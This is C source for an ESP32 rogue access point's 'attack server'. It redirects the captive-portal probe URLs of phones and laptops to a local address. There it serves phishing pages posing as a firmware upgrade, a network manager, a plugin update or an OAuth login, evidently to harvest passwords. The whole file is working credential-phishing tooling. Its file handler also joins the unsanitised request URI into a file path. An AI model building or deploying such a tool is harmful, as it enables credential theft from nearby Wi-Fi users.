#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_log.h>
#include <lwip/sockets.h>
#include <esp_http_server.h>

#include "server.h"
#include "server_api.h"

/* Pages include */
#include "web/passwords.h"

#define CAPTIVE_PORTAL_URL "http://192.168.4.1/"

static const char *TAG = "HTTPD";
static httpd_handle_t server = NULL;
static uint8_t attack_scheme = 0;

static esp_err_t captive_portal_redirect(httpd_req_t *req)
{
	httpd_resp_set_status(req, "302 Found");
	//httpd_resp_set_hdr(req, "Host", host);
	httpd_resp_set_hdr(req, "Location", CAPTIVE_PORTAL_URL);
	httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
	httpd_resp_set_hdr(req, "Content-Length", "0");
	httpd_resp_send(req, NULL, 0);
	return ESP_OK;
}


static esp_err_t redirect_handler(httpd_req_t *req) 
{
	/* Request information */
	//char Host[64] = { 0 };
	//char UserAgent[128] = { 0 };
	//char ContentType[64] = { 0 };
	//char ContentLen[8] = { 0 };
	//char Referer[64] = { 0 };
	char filepath[128] = "/spiffs";
	const char *uri = req->uri;

	/* Read request header */
	/*int len = httpd_req_get_hdr_value_len(req, "Host");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Host", Host, len+1);
    }
	len = httpd_req_get_hdr_value_len(req, "User-Agent");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "User-Agent", UserAgent, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Type");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Type", ContentType, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Length");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Length", ContentLen, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Referer");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Referer", Referer, len);
    }*/

	/* Redirect to captive portal */
	if(strcmp(uri, "/hotspot-detect.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/library/test/success.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/generate_204") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/connecttest.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/ncsi.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/check_network_status.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/canonical.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/redirect") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	
    if (strcmp(uri, "/") == 0) { 
		switch(attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				uri = "/fwupgrade/index.html";
				break;
			
			case WEB_NET_MANAGER:
				uri = "/netmng/index.html";
				break;

			case PLUGIN_UPDATE:
				uri = "/plugin.html";
				break;

			case OAUTH_LOGIN:
				uri = "/oauth/index.html";
				break;

			default:
				uri = "/upgrade.html";
				break;
		}
	}
    strlcat(filepath, uri, sizeof(filepath));

    FILE *f = fopen(filepath, "r");
    if (!f) 
    { 
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
        return ESP_OK; 
    }

    httpd_resp_set_type(req, mime_from_path(filepath));
	
    char buf[1024];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) 
    {
        if (httpd_resp_send_chunk(req, buf, n) != ESP_OK) 
        { 
            fclose(f); 
            return ESP_FAIL; 
        }
    }
    fclose(f);
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}


void http_attack_server_start(void)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Attack server already started.");
		return;
	}

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.max_resp_headers = 16;
	config.recv_wait_timeout = 10;
	config.send_wait_timeout = 10;
	config.lru_purge_enable = true;
	config.max_uri_handlers = 20;

    if (httpd_start(&server, &config) == ESP_OK) 
	{
		ESP_ERROR_CHECK(register_server_api_handlers(server));

		httpd_uri_t any = {
            .uri = "/*", 
            .method = HTTP_GET, 
            .handler = redirect_handler, 
            .user_ctx = NULL
        };
        ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any));
    }
	else
	{
		ESP_LOGE(TAG, "Failed to start captive portal server.");
	}
}


void http_attack_server_stop(void)
{
	if( server != NULL )
    {
        if( httpd_stop(server) != ESP_OK )
        {
            ESP_LOGD(TAG, "Failed to stop attack server.");
            return;
        }
		server = NULL;
    }
}